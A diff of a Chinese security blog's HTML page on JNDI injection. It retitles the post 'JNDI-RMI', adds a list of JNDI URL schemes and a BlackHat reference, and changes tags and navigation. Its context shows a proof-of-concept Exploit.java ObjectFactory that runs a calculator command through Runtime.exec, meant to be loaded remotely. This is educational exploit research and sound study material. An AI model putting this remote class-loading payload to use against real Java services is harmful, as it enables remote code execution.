@@ -6,11 +6,11 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://m0d9.me">
-  <title>JNDI：注入基础篇 | m0d9&#39;s blog</title>
+  <title>JNDI-RMI | m0d9&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="反序列利用的时候经常会用到jndi加载远程class，原理是什么？ 什么是JNDIJNDI到底是什么，有什么作用 什么是JNDI Injection深入理解JNDI注入与Java反序列化漏洞利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JNDI：注入基础篇">
+<meta property="og:title" content="JNDI-RMI">
 <meta property="og:url" content="http://m0d9.me/2020/03/26/JNDI%EF%BC%9A%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%AF%87/index.html">
 <meta property="og:site_name" content="m0d9&#39;s blog">
 <meta property="og:description" content="反序列利用的时候经常会用到jndi加载远程class，原理是什么？ 什么是JNDIJNDI到底是什么，有什么作用 什么是JNDI Injection深入理解JNDI注入与Java反序列化漏洞利用">
@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://m0d9.me/images/pasted-7.png">
 <meta property="og:image" content="http://m0d9.me/images/pasted-8.png">
 <meta property="article:published_time" content="2020-03-26T09:29:00.000Z">
-<meta property="article:modified_time" content="2020-10-10T13:20:18.828Z">
+<meta property="article:modified_time" content="2021-12-01T05:28:37.489Z">
 <meta property="article:author" content="m0d9">
 <meta property="article:tag" content="JDNI">
 <meta property="article:tag" content="Java">
@@ -186,7 +186,7 @@ ga('send', 'pageview');
         
   
     <h1 class="article-title" itemprop="name">
-      JNDI：注入基础篇
+      JNDI-RMI
     </h1>
   
 
@@ -204,6 +204,16 @@ ga('send', 'pageview');
 <h2 id="什么是JNDI-Injection"><a href="#什么是JNDI-Injection" class="headerlink" title="什么是JNDI Injection"></a>什么是JNDI Injection</h2><p><a target="_blank" rel="noopener" href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用</a></p>
 <a id="more"></a>
 
+
+<ul>
+<li>rmi://  com.sun.jndi.url.rmi.rmiURLContext</li>
+<li>ldap://  com.sun.jndi.url.ldap.ldapURLContext</li>
+<li>ldaps://  com.sun.jndi.url.ldaps.ldapsURLContextFactory</li>
+<li>iiop://  com.sun.jndi.url.iiop.iiopURLContext</li>
+<li>dns://  com.sun.jndi.url.dns.dnsURLContext</li>
+<li>iiopname://  com.sun.jndi.url.iiopname.iiopnameURLContextFactory</li>
+<li>corbaname://</li>
+</ul>
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ol>
 <li><p>启动http server存放Exploit.class</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># file Exploit.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -243,6 +253,7 @@ decode class
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
 <li><a target="_blank" rel="noopener" href="https://www.iteye.com/blog/shitou521-696006">JNDI到底是什么，有什么作用</a></li>
 <li><a target="_blank" rel="noopener" href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">BlackHat-us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE</a></li>
 </ol>
 
       
@@ -291,11 +302,11 @@ decode class
   
 <nav id="article-nav">
   
-    <a href="/2020/05/07/SpringBoot-H2-RCE%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/03/27/JNDI%EF%BC%9A%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Spring Boot + H2 JNDI注入复现
+          JNDI-LDAP
         
       </div>
     </a>
@@ -359,7 +370,7 @@ decode class
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021 m0d9
+    		&copy; 2022 m0d9
     	</div>
       	<div class="footer-right">
       		<!-- <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten -->
@@ -452,15 +463,11 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">JDNI</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">dns</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tunnel</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -525,10 +532,6 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Spring</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">celery</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -666,6 +669,10 @@ MathJax.Hub.Queue(function() {
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">CodeQL</a>
               </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Groovy1</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
@@ -717,6 +724,10 @@ MathJax.Hub.Queue(function() {
           
             <li class="search-li">
               <a href="https://pyn3rd.github.io/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>pyn3rd</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://yzddmr6.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>yzddmr6</a>
             </li>
           
             <li class="search-li">
